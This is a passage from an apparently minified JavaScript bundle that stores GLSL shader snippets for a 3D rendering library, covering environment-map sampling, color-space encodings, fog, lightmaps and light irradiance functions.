vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract(sin(sn) * c);\n}\n#ifdef HIGH_PRECISION\n\tfloat precisionSafeLength( vec3 v ) { return length( v ); }\n#else\n\tfloat max3( vec3 v ) { return max( max( v.x, v.y ), v.z ); }\n\tfloat precisionSafeLength( vec3 v ) {\n\t\tfloat maxComponent = max3( abs( v ) );\n\t\treturn length( v / maxComponent ) * maxComponent;\n\t}\n#endif\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n#ifdef CLEARCOAT\n\tvec3 clearcoatNormal;\n#endif\n};\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n}\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n}\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\tfloat distance = dot( planeNormal, point - pointOnPlane );\n\treturn - distance * planeNormal + point;\n}\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn sign( dot( point - pointOnPlane, planeNormal ) );\n}\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\n}\nmat3 transposeMat3( const in mat3 m ) {\n\tmat3 tmp;\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\treturn tmp;\n}\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\treturn dot( weights, color.rgb );\n}",cube_uv_reflection_fragment:"#ifdef ENVMAP_TYPE_CUBE_UV\n#define cubeUV_textureSize (1024.0)\nint getFaceFromDirection(vec3 direction) {\n\tvec3 absDirection = abs(direction);\n\tint face = -1;\n\tif( absDirection.x > absDirection.z ) {\n\t\tif(absDirection.x > absDirection.y )\n\t\t\tface = direction.x > 0.0 ? 0 : 3;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\telse {\n\t\tif(absDirection.z > absDirection.y )\n\t\t\tface = direction.z > 0.0 ? 2 : 5;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\treturn face;\n}\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\n\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\n\tfloat dxRoughness = dFdx(roughness);\n\tfloat dyRoughness = dFdy(roughness);\n\tvec3 dx = dFdx( vec * scale * dxRoughness );\n\tvec3 dy = dFdy( vec * scale * dyRoughness );\n\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\n\td = clamp(d, 1.0, cubeUV_rangeClamp);\n\tfloat mipLevel = 0.5 * log2(d);\n\treturn vec2(floor(mipLevel), fract(mipLevel));\n}\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\n\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\n\tfloat a = 16.0 * cubeUV_rcpTextureSize;\n\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\n\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\n\tfloat powScale = exp2_packed.x * exp2_packed.y;\n\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\n\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\n\tbool bRes = mipLevel == 0.0;\n\tscale =  bRes && (scale < a) ? a : scale;\n\tvec3 r;\n\tvec2 offset;\n\tint face = getFaceFromDirection(direction);\n\tfloat rcpPowScale = 1.0 / powScale;\n\tif( face == 0) {\n\t\tr = vec3(direction.x, -direction.z, direction.y);\n\t\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 1) {\n\t\tr = vec3(direction.y, direction.x, direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 2) {\n\t\tr = vec3(direction.z, direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 3) {\n\t\tr = vec3(direction.x, direction.z, direction.y);\n\t\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse if( face == 4) {\n\t\tr = vec3(direction.y, direction.x, -direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse {\n\t\tr = vec3(direction.z, -direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\tr = normalize(r);\n\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\n\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\n\tvec2 base = offset + vec2( texelOffset );\n\treturn base + s * ( scale - 2.0 * texelOffset );\n}\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\nvec4 textureCubeUV( sampler2D envMap, vec3 reflectedDirection, float roughness ) {\n\tfloat roughnessVal = roughness* cubeUV_maxLods3;\n\tfloat r1 = floor(roughnessVal);\n\tfloat r2 = r1 + 1.0;\n\tfloat t = fract(roughnessVal);\n\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\n\tfloat s = mipInfo.y;\n\tfloat level0 = mipInfo.x;\n\tfloat level1 = level0 + 1.0;\n\tlevel1 = level1 > 5.0 ? 5.0 : level1;\n\tlevel0 += min( floor( s + 0.5 ), 5.0 );\n\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\n\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\n\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\n\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\n\tvec4 result = mix(color10, color20, t);\n\treturn vec4(result.rgb, 1.0);\n}\n#endif",defaultnormal_vertex:"vec3 transformedNormal = normalMatrix * objectNormal;\n#ifdef FLIP_SIDED\n\ttransformedNormal = - transformedNormal;\n#endif\n#ifdef USE_TANGENT\n\tvec3 transformedTangent = normalMatrix * objectTangent;\n\t#ifdef FLIP_SIDED\n\t\ttransformedTangent = - transformedTangent;\n\t#endif\n#endif",displacementmap_pars_vertex:"#ifdef USE_DISPLACEMENTMAP\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n#endif",displacementmap_vertex:"#ifdef USE_DISPLACEMENTMAP\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\n#endif",emissivemap_fragment:"#ifdef USE_EMISSIVEMAP\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n#endif",emissivemap_pars_fragment:"#ifdef USE_EMISSIVEMAP\n\tuniform sampler2D emissiveMap;\n#endif",encodings_fragment:"gl_FragColor = linearToOutputTexel( gl_FragColor );",encodings_pars_fragment:"\nvec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( gammaFactor ) ), value.a );\n}\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( 1.0 / gammaFactor ) ), value.a );\n}\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}\nvec4 RGBEToLinear( in vec4 value ) {\n\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\n}\nvec4 LinearToRGBE( in vec4 value ) {\n\tfloat maxComponent = max( max( value.r, value.g ), value.b );\n\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\n\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\n}\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * value.a * maxRange, 1.0 );\n}\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat M = clamp( maxRGB / maxRange, 0.0, 1.0 );\n\tM = ceil( M * 255.0 ) / 255.0;\n\treturn vec4( value.rgb / ( M * maxRange ), M );\n}\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\n}\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat D = max( maxRange / maxRGB, 1.0 );\n\tD = min( floor( D ) / 255.0, 1.0 );\n\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\n}\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\nvec4 LinearToLogLuv( in vec4 value )  {\n\tvec3 Xp_Y_XYZp = cLogLuvM * value.rgb;\n\tXp_Y_XYZp = max( Xp_Y_XYZp, vec3( 1e-6, 1e-6, 1e-6 ) );\n\tvec4 vResult;\n\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\n\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\n\tvResult.w = fract( Le );\n\tvResult.z = ( Le - ( floor( vResult.w * 255.0 ) ) / 255.0 ) / 255.0;\n\treturn vResult;\n}\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\nvec4 LogLuvToLinear( in vec4 value ) {\n\tfloat Le = value.z * 255.0 + value.w;\n\tvec3 Xp_Y_XYZp;\n\tXp_Y_XYZp.y = exp2( ( Le - 127.0 ) / 2.0 );\n\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\n\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\n\tvec3 vRGB = cLogLuvInverseM * Xp_Y_XYZp.rgb;\n\treturn vec4( max( vRGB, 0.0 ), 1.0 );\n}",envmap_fragment:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#else\n\t\tvec3 reflectVec = vReflect;\n\t#endif\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\t\tvec2 sampleUV;\n\t\treflectVec = normalize( reflectVec );\n\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\t\tvec4 envColor = texture2D( envMap, sampleUV );\n\t#elif defined( ENVMAP_TYPE_SPHERE )\n\t\treflectVec = normalize( reflectVec );\n\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0, 0.0, 1.0 ) );\n\t\tvec4 envColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5 );\n\t#else\n\t\tvec4 envColor = vec4( 0.0 );\n\t#endif\n\tenvColor = envMapTexelToLinear( envColor );\n\t#ifdef ENVMAP_BLENDING_MULTIPLY\n\t\toutgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_MIX )\n\t\toutgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );\n\t#elif defined( ENVMAP_BLENDING_ADD )\n\t\toutgoingLight += envColor.xyz * specularStrength * reflectivity;\n\t#endif\n#endif",envmap_common_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float envMapIntensity;\n\tuniform float flipEnvMap;\n\tuniform int maxMipLevel;\n\t#ifdef ENVMAP_TYPE_CUBE\n\t\tuniform samplerCube envMap;\n\t#else\n\t\tuniform sampler2D envMap;\n\t#endif\n\t\n#endif",envmap_pars_fragment:"#ifdef USE_ENVMAP\n\tuniform float reflectivity;\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\tvarying vec3 vWorldPosition;\n\t\tuniform float refractionRatio;\n\t#else\n\t\tvarying vec3 vReflect;\n\t#endif\n#endif",envmap_pars_vertex:"#ifdef USE_ENVMAP\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) ||defined( PHONG )\n\t\t#define ENV_WORLDPOS\n\t#endif\n\t#ifdef ENV_WORLDPOS\n\t\t\n\t\tvarying vec3 vWorldPosition;\n\t#else\n\t\tvarying vec3 vReflect;\n\t\tuniform float refractionRatio;\n\t#endif\n#endif",envmap_physical_pars_fragment:"#if defined( USE_ENVMAP )\n\t#ifdef ENVMAP_MODE_REFRACTION\n\t\tuniform float refractionRatio;\n\t#endif\n\tvec3 getLightProbeIndirectIrradiance( const in GeometricContext geometry, const in int maxMIPLevel ) {\n\t\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryVec, float( maxMIPLevel ) );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 queryVec = vec3( flipEnvMap * worldNormal.x, worldNormal.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryVec, 1.0 );\n\t\t#else\n\t\t\tvec4 envMapColor = vec4( 0.0 );\n\t\t#endif\n\t\treturn PI * envMapColor.rgb * envMapIntensity;\n\t}\n\tfloat getSpecularMIPLevel( const in float roughness, const in int maxMIPLevel ) {\n\t\tfloat maxMIPLevelScalar = float( maxMIPLevel );\n\t\tfloat sigma = PI * roughness * roughness / ( 1.0 + roughness );\n\t\tfloat desiredMIPLevel = maxMIPLevelScalar + log2( sigma );\n\t\treturn clamp( desiredMIPLevel, 0.0, maxMIPLevelScalar );\n\t}\n\tvec3 getLightProbeIndirectRadiance( const in vec3 viewDir, const in vec3 normal, const in float roughness, const in int maxMIPLevel ) {\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t  vec3 reflectVec = reflect( -viewDir, normal );\n\t\t  reflectVec = normalize( mix( reflectVec, normal, roughness * roughness) );\n\t\t#else\n\t\t  vec3 reflectVec = refract( -viewDir, normal, refractionRatio );\n\t\t#endif\n\t\treflectVec = inverseTransformDirection( reflectVec, viewMatrix );\n\t\tfloat specularMIPLevel = getSpecularMIPLevel( roughness, maxMIPLevel );\n\t\t#ifdef ENVMAP_TYPE_CUBE\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = textureCubeLodEXT( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = textureCube( envMap, queryReflectVec, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_CUBE_UV )\n\t\t\tvec3 queryReflectVec = vec3( flipEnvMap * reflectVec.x, reflectVec.yz );\n\t\t\tvec4 envMapColor = textureCubeUV( envMap, queryReflectVec, roughness );\n\t\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\t\t\tvec2 sampleUV;\n\t\t\tsampleUV.y = asin( clamp( reflectVec.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;\n\t\t\tsampleUV.x = atan( reflectVec.z, reflectVec.x ) * RECIPROCAL_PI2 + 0.5;\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, sampleUV, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = texture2D( envMap, sampleUV, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#elif defined( ENVMAP_TYPE_SPHERE )\n\t\t\tvec3 reflectView = normalize( ( viewMatrix * vec4( reflectVec, 0.0 ) ).xyz + vec3( 0.0,0.0,1.0 ) );\n\t\t\t#ifdef TEXTURE_LOD_EXT\n\t\t\t\tvec4 envMapColor = texture2DLodEXT( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\t\t\t#else\n\t\t\t\tvec4 envMapColor = texture2D( envMap, reflectView.xy * 0.5 + 0.5, specularMIPLevel );\n\t\t\t#endif\n\t\t\tenvMapColor.rgb = envMapTexelToLinear( envMapColor ).rgb;\n\t\t#endif\n\t\treturn envMapColor.rgb * envMapIntensity;\n\t}\n#endif",envmap_vertex:"#ifdef USE_ENVMAP\n\t#ifdef ENV_WORLDPOS\n\t\tvWorldPosition = worldPosition.xyz;\n\t#else\n\t\tvec3 cameraToVertex = normalize( worldPosition.xyz - cameraPosition );\n\t\tvec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\t\t\tvReflect = reflect( cameraToVertex, worldNormal );\n\t\t#else\n\t\t\tvReflect = refract( cameraToVertex, worldNormal, refractionRatio );\n\t\t#endif\n\t#endif\n#endif",fog_vertex:"#ifdef USE_FOG\n\tfogDepth = -mvPosition.z;\n#endif",fog_pars_vertex:"#ifdef USE_FOG\n\tvarying float fogDepth;\n#endif",fog_fragment:"#ifdef USE_FOG\n\t#ifdef FOG_EXP2\n\t\tfloat fogFactor = 1.0 - exp( - fogDensity * fogDensity * fogDepth * fogDepth );\n\t#else\n\t\tfloat fogFactor = smoothstep( fogNear, fogFar, fogDepth );\n\t#endif\n\tgl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );\n#endif",fog_pars_fragment:"#ifdef USE_FOG\n\tuniform vec3 fogColor;\n\tvarying float fogDepth;\n\t#ifdef FOG_EXP2\n\t\tuniform float fogDensity;\n\t#else\n\t\tuniform float fogNear;\n\t\tuniform float fogFar;\n\t#endif\n#endif",gradientmap_pars_fragment:"#ifdef TOON\n\tuniform sampler2D gradientMap;\n\tvec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {\n\t\tfloat dotNL = dot( normal, lightDirection );\n\t\tvec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );\n\t\t#ifdef USE_GRADIENTMAP\n\t\t\treturn texture2D( gradientMap, coord ).rgb;\n\t\t#else\n\t\t\treturn ( coord.x < 0.7 ) ? vec3( 0.7 ) : vec3( 1.0 );\n\t\t#endif\n\t}\n#endif",lightmap_fragment:"#ifdef USE_LIGHTMAP\n\treflectedLight.indirectDiffuse += PI * texture2D( lightMap, vUv2 ).xyz * lightMapIntensity;\n#endif",lightmap_pars_fragment:"#ifdef USE_LIGHTMAP\n\tuniform sampler2D lightMap;\n\tuniform float lightMapIntensity;\n#endif",lights_lambert_vertex:"vec3 diffuse = vec3( 1.0 );\nGeometricContext geometry;\ngeometry.position = mvPosition.xyz;\ngeometry.normal = normalize( transformedNormal );\ngeometry.viewDir = normalize( -mvPosition.xyz );\nGeometricContext backGeometry;\nbackGeometry.position = geometry.position;\nbackGeometry.normal = -geometry.normal;\nbackGeometry.viewDir = geometry.viewDir;\nvLightFront = vec3( 0.0 );\nvIndirectFront = vec3( 0.0 );\n#ifdef DOUBLE_SIDED\n\tvLightBack = vec3( 0.0 );\n\tvIndirectBack = vec3( 0.0 );\n#endif\nIncidentLight directLight;\nfloat dotNL;\nvec3 directLightColor_Diffuse;\n#if NUM_POINT_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_POINT_LIGHTS; i ++ ) {\n\t\tgetPointDirectLightIrradiance( pointLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_SPOT_LIGHTS; i ++ ) {\n\t\tgetSpotDirectLightIrradiance( spotLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_DIR_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_DIR_LIGHTS; i ++ ) {\n\t\tgetDirectionalDirectLightIrradiance( directionalLights[ i ], geometry, directLight );\n\t\tdotNL = dot( geometry.normal, directLight.direction );\n\t\tdirectLightColor_Diffuse = PI * directLight.color;\n\t\tvLightFront += saturate( dotNL ) * directLightColor_Diffuse;\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvLightBack += saturate( -dotNL ) * directLightColor_Diffuse;\n\t\t#endif\n\t}\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < NUM_HEMI_LIGHTS; i ++ ) {\n\t\tvIndirectFront += getHemisphereLightIrradiance( hemisphereLights[ i ], geometry );\n\t\t#ifdef DOUBLE_SIDED\n\t\t\tvIndirectBack += getHemisphereLightIrradiance( hemisphereLights[ i ], backGeometry );\n\t\t#endif\n\t}\n#endif",lights_pars_begin:"uniform vec3 ambientLightColor;\nuniform vec3 lightProbe[ 9 ];\nvec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {\n\tfloat x = normal.x, y = normal.y, z = normal.z;\n\tvec3 result = shCoefficients[ 0 ] * 0.886227;\n\tresult += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;\n\tresult += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;\n\tresult += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;\n\tresult += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;\n\tresult += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;\n\tresult += shCoefficients[ 6 ] * ( 0.743125 * z * z - 0.247708 );\n\tresult += shCoefficients[ 7 ] * 2.0 * 0.429043 * x * z;\n\tresult += shCoefficients[ 8 ] * 0.429043 * ( x * x - y * y );\n\treturn result;\n}\nvec3 getLightProbeIrradiance( const in vec3 lightProbe[ 9 ], const in GeometricContext geometry ) {\n\tvec3 worldNormal = inverseTransformDirection( geometry.normal, viewMatrix );\n\tvec3 irradiance = shGetIrradianceAt( worldNormal, lightProbe );\n\treturn irradiance;\n}\nvec3 getAmbientLightIrradiance( const in vec3 ambientLightColor ) {\n\tvec3 irradiance = ambientLightColor;\n\t#ifndef PHYSICALLY_CORRECT_LIGHTS\n\t\tirradiance *= PI;\n\t#endif\n\treturn irradiance;\n}\n#if NUM_DIR_LIGHTS > 0\n\tstruct DirectionalLight {\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\tuniform DirectionalLight directionalLights[ NUM_DIR_LIGHTS ];\n\tvoid getDirectionalDirectLightIrradiance( const in DirectionalLight directionalLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tdirectLight.color = directionalLight.color;\n\t\tdirectLight.direction = directionalLight.direction;\n\t\tdirectLight.visible = true;\n\t}\n#endif\n#if NUM_POINT_LIGHTS > 0\n\tstruct PointLight {\n\t\tvec3 position;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t\tfloat shadowCameraNear;\n\t\tfloat shadowCameraFar;\n\t};\n\tuniform PointLight pointLights[ NUM_POINT_LIGHTS ];\n\tvoid getPointDirectLightIrradiance( const in PointLight pointLight, const in GeometricContext geometry, out IncidentLight directLight ) {\n\t\tvec3 lVector = pointLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tdirectLight.color = pointLight.color;\n\t\tdirectLight.color *= punctualLightIntensityToIrradianceFactor( lightDistance, pointLight.distance, pointLight.decay );\n\t\tdirectLight.visible = ( directLight.color != vec3( 0.0 ) );\n\t}\n#endif\n#if NUM_SPOT_LIGHTS > 0\n\tstruct SpotLight {\n\t\tvec3 position;\n\t\tvec3 direction;\n\t\tvec3 color;\n\t\tfloat distance;\n\t\tfloat decay;\n\t\tfloat coneCos;\n\t\tfloat penumbraCos;\n\t\tint shadow;\n\t\tfloat shadowBias;\n\t\tfloat shadowRadius;\n\t\tvec2 shadowMapSize;\n\t};\n\tuniform SpotLight spotLights[ NUM_SPOT_LIGHTS ];\n\tvoid getSpotDirectLightIrradiance( const in SpotLight spotLight, const in GeometricContext geometry, out IncidentLight directLight  ) {\n\t\tvec3 lVector = spotLight.position - geometry.position;\n\t\tdirectLight.direction = normalize( lVector );\n\t\tfloat lightDistance = length( lVector );\n\t\tfloat angleCos = dot( directLight.direction, spotLight.direction );\n\t\tif ( angleCos > spotLight.coneCos ) {\n\t\t\tfloat spotEffect = smoothstep( spotLight.coneCos, spotLight.penumbraCos, angleCos );\n\t\t\tdirectLight.color = spotLight.color;\n\t\t\tdirectLight.color *= spotEffect * punctualLightIntensityToIrradianceFactor( lightDistance, spotLight.distance, spotLight.decay );\n\t\t\tdirectLight.visible = true;\n\t\t} else {\n\t\t\tdirectLight.color = vec3( 0.0 );\n\t\t\tdirectLight.visible = false;\n\t\t}\n\t}\n#endif\n#if NUM_RECT_AREA_LIGHTS > 0\n\tstruct RectAreaLight {\n\t\tvec3 color;\n\t\tvec3 position;\n\t\tvec3 halfWidth;\n\t\tvec3 halfHeight;\n\t};\n\tuniform sampler2D ltc_1;\tuniform sampler2D ltc_2;\n\tuniform RectAreaLight rectAreaLights[ NUM_RECT_AREA_LIGHTS ];\n#endif\n#if NUM_HEMI_LIGHTS > 0\n\tstruct HemisphereLight {\n\t\tvec3 direction;\n\t\tvec3 skyColor;\n\t\tvec3 groundColor;\n\t};\n\tuniform HemisphereLight hemisphereLights[ NUM_HEMI_LIGHTS ];\n\tvec3 getHemisphereLightIrradiance( const in HemisphereLight hemiLight, const in GeometricContext geometry ) {\n\t\tfloat dotNL = dot( 